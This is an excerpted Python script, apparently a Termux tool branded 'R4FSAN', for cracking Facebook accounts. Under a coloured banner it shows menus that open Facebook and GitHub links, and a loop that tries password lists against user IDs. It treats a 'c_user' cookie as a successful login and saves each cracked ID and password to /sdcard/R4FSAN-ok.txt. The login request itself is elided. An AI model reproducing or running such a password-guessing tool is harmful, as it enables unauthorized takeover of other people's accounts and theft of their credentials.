...
\033[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
\033[38;5;46m ▊   ‌‌‌‌‌‌                                              ▊
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \033[38;5;196m: \033[1;92mRAFSAN AHAMMED RAFI      \033[38;5;46m                   ▊
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \033[38;5;196m: \033[1;92mMd. Arif Mia  \033[38;5;46m                    ▊
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐆𝐢𝐭𝐡𝐮𝐛    \033[38;5;196m: \033[1;92m𝐡𝐭𝐭𝐩𝐬://𝐠𝐢𝐭𝐡𝐮𝐛.𝐜𝐨𝐦/R4FSAN-143     \033[38;5;46m ▊
...
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐕𝐞𝐫𝐬𝐢𝐨𝐧   \033[38;5;196m: \033[1;92m0.0.2 \033[1;92m𝐔𝐥𝐭𝐫𝐚  \033[38;5;46m                    ▊
...
def Main():
	...
	os.system(" xdg-open https://facebook.com/groups/3206414299669908/NSMWBT")
	print(51*'\033[92;1m▬')
...
def admin():
	...
	bal = input('𝐂𝐡𝐨𝐨𝐬𝐞 > ')
	if bal =='1':
		os.system('xdg-open https://www.facebook.com/saifulis11');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://github.com/R4FSAN-143');time.sleep(1)
		admin()
	if bal =='3':
		Main()
def x():
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m R4FSAN \033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/R4FSAN-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
